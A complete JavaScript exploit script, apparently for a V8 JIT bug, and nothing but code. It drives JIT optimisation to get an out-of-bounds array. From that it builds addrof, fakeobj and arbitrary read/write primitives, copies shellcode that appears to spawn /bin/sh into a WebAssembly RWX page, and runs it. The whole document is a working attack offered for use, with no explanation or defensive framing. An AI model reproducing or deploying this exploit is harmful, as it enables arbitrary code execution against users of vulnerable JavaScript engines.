var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x150);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}


function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    v = Math.abs(v);
    v += 2;
    v >>= 1;
    v += 10;
    var arr = new Array(v);
    arr[0] = 1.1;
    return arr;
}


for (let i = 0; i < 100000; i++) 
    foo();

var oob = foo();
var obj = {"A":1.1};
var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var float_arr_map = ftoi(oob[31]) & 0xffffffffn;
var obj_arr_map = ((ftoi(oob[21]) >> 32n));
console.log("Float_arr_map: 0x"+float_arr_map.toString(16));
console.log("Obj_arr_map: 0x"+obj_arr_map.toString(16));

function addrof(k){
    obj_arr[0] = k;
    oob[21] = itof(float_arr_map << 32n);
    let res = obj_arr[0];
    oob[21] = itof(obj_arr_map << 32n);
    return ftoi(res) & 0xffffffffn;
}

function fakeobj(k){
    float_arr[0] = itof(k);
    oob[31] = itof(obj_arr_map);
    let fake = float_arr[0];
    oob[31] = itof(float_arr_map);
    return fake;
}

var arr2 = [itof(float_arr_map), 1.1, 1.2, 1.3];
console.log("Arr2: 0x"+addrof(arr2).toString(16));
var fake = fakeobj((addrof(arr2)+0x20n));

function arb_read(addr){
    if(addr % 2n == 0)
        addr += 1n;

    arr2[1] = itof((8n << 32n) + addr - 8n);
    return fake[0];
}

function arb_write(addr, val){
    if(addr % 2n == 0)
        addr += 1n;
    arr2[1] = itof((8n << 32n) + (addr)-8n);
    fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr2, shellcode) {
    let dataview = new DataView(buf2);
    let buf_addr = addrof(buf2);
    let backing_store_addr = buf_addr + 0x14n+0x8n;
    //%DebugPrint(backing_store_addr);
    arb_write(backing_store_addr, addr2);
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

var test_addr = addrof(wasm_instance)+0x60n;
var rwx_page_addr = ftoi(arb_read(test_addr));
console.log("ADDRESS RWX: 0x"+(rwx_page_addr).toString(16));
var shellcode = [3091753066, 1852400175, 1932472111, 3884533840, 23687784, 607420673, 16843009, 1784084017, 21519880, 2303219430, 1792160230, 84891707];
copy_shellcode(rwx_page_addr, shellcode);
f();